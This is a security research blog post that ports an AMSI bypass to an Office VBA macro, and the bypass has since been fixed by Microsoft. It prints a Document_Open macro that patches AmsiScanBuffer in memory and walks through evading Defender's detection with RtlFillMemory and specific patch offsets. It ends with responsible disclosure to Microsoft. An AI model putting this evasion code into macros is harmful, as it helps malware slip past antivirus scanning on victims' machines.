---
layout: post
date:   2019-03-24 00:00:00 +0200
categories: research
description: "Microsfot fixed their detection logic, so this doesn't work anymore."
title:  "Office 365 AMSI Bypass (fixed)"
---
# Introduction
[I moved this article to my new blog. Click here to read it there.](https://idafchev.github.io/blog/office365_amsi_bypass/)  

While I was playing around with the publicly available AMSI bypass PoCs for powershell I got curious if such bypass was available for Office 365. Google didn't show anything useful, so that's when I decided to try and port one of the powershell PoCs to VBA macro and see if it works.

If you aren't familiar with AMSI and the way to "bypass" it, I recommend reading the following resources first (in this order):
1. [https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/)
2. [https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/)
3. [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
4. [https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/](https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/)
5. [https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/](https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/)
6. [https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/)
7. [https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/](https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/)
8. [https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)

# Porting the AMSI Bypass to VBA
First, I ported the patch from the "[AmsiScanBuffer Bypass - Part 3](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/)" blog post of rastamouse. This implementation patched the beginning of *AmsiScanBuffer*{: style="color: LightGreen"} function with the bytes 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 which are equivalent to:  
```nasm
mov eax, 80070057h
ret
```

The resulting macro is shown below:  
```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Private Sub Document_Open()
    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr

    MyByteArray(0) = 184 ' 0xB8
    MyByteArray(1) = 87  ' 0x57
    MyByteArray(2) = 0   ' 0x00
    MyByteArray(3) = 7   ' 0x07
    MyByteArray(4) = 128 ' 0x80
    MyByteArray(5) = 195 ' 0xC3

    AmsiDLL = LoadLibrary("amsi.dll")
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
    ArrayPointer = VarPtr(MyByteArray(0))
    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
    
End Sub
```

I created a Word document with the embedded macro, saved it, opened it again and clicked "Enable Content". The following popup message showed, saying that the bypass was detected as malicious macro.  

<div style="text-align:center"><img src ="/images/office365_amsi_bypass/malicious_macro_popup.png" /></div>

I tried obfuscating the code by splitting the strings, but while this works in powershell it didn't work with VBA. If you've read the 8th resource I gave in the introduction, you probably remember the following picture:  
![amsi_vba.png](/images/office365_amsi_bypass/amsi_vba.png)  
*source:[https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)*

VBA has a behavior log and the contents of this behavior log are passed to AMSI, which then passes them to the installed AV for scanning. This means that obfuscating the macro isn't going to work, thus I tried another approach. I took the address of *AmsiCloseSession*{: style="color: LightGreen"} function and then added an offset to it, so I can get the address of *AmsiScanBuffer*{: style="color: LightGreen"}. That way I used *"AmsiCloseSession"*{: style="color: LightSalmon"} string instead of *"AmsiScanBuffer"*{: style="color: LightSalmon"} in the *GetProcAddress*{: style="color: LightGreen"} function, but this also got detected.

```vb
AmsiDLL = LoadLibrary("amsi.dll")
AmsiCloseSessionAddr = GetProcAddress(AmsiDLL, "AmsiCloseSession")
AmsiScanBufferAddr = AmsiCloseSessionAddr + 80
```

I needed to see what exactly was triggering the detection and for that purpose I used the API Monitor tool. In the picture below, you can see that the *AmsiScanString*{: style="color: LightGreen"} function is used, not *AmsiScanBuffer*{: style="color: LightGreen"}, and the final contents of the scanned buffer right before the detection. *Open the screenshot in a new tab to view in bigger format.*

![vba_behavior_log.png](/images/office365_amsi_bypass/vba_behavior_log.png)

Note: You should be aware that API Monitor might interfere with the code. When I attached API Monitor before running the macro, *GetProcAddress*{: style="color: LightGreen"} returned wrong address. As a workaround I used a *MsgBox*{: style="color: LightGreen"} to pause execution right after *GetProcAddress*{: style="color: LightGreen"} and then proceeded with attaching API Monitor.

If you disassemble *AmsiScanString*{: style="color: LightGreen"} you'll notice that it calls *AmsiScanBuffer*{: style="color: LightGreen"}, so I decided to patch both functions just to be sure. The patch is the same for both of them. Their disassembly can be seen in the following two pictures.

![amsi_scan_string.png](/images/office365_amsi_bypass/amsi_scan_string.png)  
![amsi_scan_buffer.png](/images/office365_amsi_bypass/amsi_scan_buffer.png)

My theory was that the detection was based on the *"amsi.dll"*{: style="color: LightSalmon"} and *"kernel32.RtlMoveMemory()"*{: style="color: LightSalmon"} strings in the behavior log. To test this I did the following things:
1. Removed *RtlMoveMemory*{: style="color: LightGreen"} from the code. This resulted in no detection.
2. Kept *RtlMoveMemory*{: style="color: LightGreen"}, but changed *LoadLibrary*{: style="color: LightGreen"} to load *"kernel32.dll"*{: style="color: LightSalmon"} instead. This of course crashed after *RtlMoveMemory*{: style="color: LightGreen"}, but I verified with API monitor that everything including *RtlMoveMemory*{: style="color: LightGreen"} was in the behavior log and passed to AMSI before crashing. Also no detection.
3. Removed *RtlMoveMemory*{: style="color: LightGreen"}, used *LoadLibrary(*{: style="color: LightGreen"}*"kernel32.dll"*{: style="color: LightSalmon"}*)*{: style="color: LightGreen"} and *GetProcAddress(*{: style="color: LightGreen"}*TargetDLL*{: style="color: LightSalmon"},*"amsi.dll kernel32.RtlMoveMemory(123,123,123)"*{: style="color: LightSalmon"}*)*{: style="color: LightGreen"}. This showed up in the behavior log and was detected as malicious, although *LoadLibrary*{: style="color: LightGreen"} didn't load *"amsi.dll"*{: style="color: LightSalmon"} and *RtlMoveMemory*{: style="color: LightGreen"} was never called. The macro was blocked before execution so the invalid *GetProcAddress*{: style="color: LightGreen"} was never actually called.

The result of the third step can be seen below:  
![detection_logic_test.png](/images/office365_amsi_bypass/detection_logic_test.png)

This proved my theory that the detection was based on both *"amsi.dll"*{: style="color: LightSalmon"} and *"kernel32.RtlMoveMemory()"*{: style="color: LightSalmon"} strings when present in the behavior log. 

To get around this I tried using another function to patch memory. I used *RtlFillMemory*{: style="color: LightGreen"} to patch one byte at a time and with it I successfully bypassed detection. I also verified with windbg that the functions were successfully patched. 

There was a problem though. If after the bypass code I added another WinAPI function then Word crashed. I figured that this might be caused by the rastamouse variant of the patch. I didn't know why and was too lazy to debug the issue so I just tried the patch from CyberArk which worked fine and didn't crash Word when I added more code after the bypass.

AmsiScanStringAddr + 5 was patched with:  
```nasm
nop
xor edx, edx
```

AmsiScanBufferAddr + 66 was patched with:  
```nasm
nop
xor eax, eax
```

PoC Video:  
[https://www.youtube.com/watch?v=9jXzP3UusD0](https://www.youtube.com/watch?v=9jXzP3UusD0)

# Contacting Microsoft
This bypass isn't anything serious or groundbreaking, after all it's widely known that AMSI can be patched in memory. It's also known that this isn't a vulnerability according to Microsoft and probably it wouldn't get fixed, because the ability to patch AMSI is a by design weakness. I also wasn't sure if the Office 365 AMSI bypas was actually new or I didn't google enough.

But I still didn't feel comfortable sharing the code while someone could potentially use it in a macro malware... So I decided to contact Microsoft and suggest they add a detection for when *"amsi.dll"*{: style="color: LightSalmon"} is used with other memory modifying functions and not only *RtlMoveMemory*{: style="color: LightGreen"}. Their response was that they modified their detection logic to address this issue :)

I'm still not sharing my final code, but by reading this blog post you should be able to write it yourself. Don't expect it to run if your Defender definitions are up to date!
